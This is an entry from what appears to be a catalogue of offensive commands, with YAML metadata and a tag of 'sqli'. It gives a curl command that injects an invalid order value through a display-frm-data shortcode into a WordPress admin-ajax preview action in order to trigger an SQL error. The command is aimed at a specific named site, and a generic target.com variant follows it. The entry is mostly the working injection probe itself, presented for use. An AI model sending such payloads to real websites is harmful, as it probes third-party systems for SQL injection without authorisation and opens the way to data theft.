---
id: cmd-curl-error-004
data: >-
  curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data
  'action=frm_forms_preview&after_html=XXX[display-frm-data id=835 order_by=id
  limit=1 order=zzz]YYY'
tags:
  - sqli
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:09.985Z'
verified: false
validated: true
submitted: true
---
# curl-trigger-sql-error

## Command

```bash
curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=XXX[display-frm-data id=835 order_by=id limit=1 order=zzz]YYY'
```

## Description

Triggers SQL error by injecting invalid order parameter.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `order` | Invalid value 'zzz' | Yes |

## Examples

### Basic Usage

```bash
curl -s -i 'https://target.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=[display-frm-data id=1 order=invalid]'
```

## Expected Output

Partial or empty response; error in logs.

## Related

- [[Related Procedure: Trigger-SQL-Error-in-Display-Frm-Data]]
